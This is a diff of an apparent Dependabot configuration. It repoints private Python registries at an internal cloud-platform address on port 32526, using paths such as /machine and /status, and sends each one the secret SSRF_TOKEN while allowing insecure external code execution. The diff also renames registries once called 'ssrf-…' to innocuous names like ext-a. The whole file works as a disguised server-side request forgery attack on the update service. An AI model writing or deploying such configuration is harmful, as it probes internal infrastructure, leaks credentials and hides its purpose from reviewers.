@@ -1,12 +1,20 @@
 version: 2
 registries:
-  ssrf-32526:
+  ext-a:
     type: python-index
-    url: http://168.63.129.16:32526/#
+    url: http://168.63.129.16:32526/extensions#
     token: ${{ secrets.SSRF_TOKEN }}
-  ssrf-internal:
+  ext-b:
     type: python-index
-    url: http://10.0.0.1/#
+    url: http://168.63.129.16:32526/status#
+    token: ${{ secrets.SSRF_TOKEN }}
+  ext-c:
+    type: python-index
+    url: http://168.63.129.16:32526/machine#
+    token: ${{ secrets.SSRF_TOKEN }}
+  ext-d:
+    type: python-index
+    url: http://168.63.129.16:32526/api#
     token: ${{ secrets.SSRF_TOKEN }}
 updates:
   - package-ecosystem: "pip"
@@ -15,5 +23,7 @@ updates:
       interval: "daily"
     insecure-external-code-execution: allow
     registries:
-      - ssrf-32526
-      - ssrf-internal
+      - ext-a
+      - ext-b
+      - ext-c
+      - ext-d
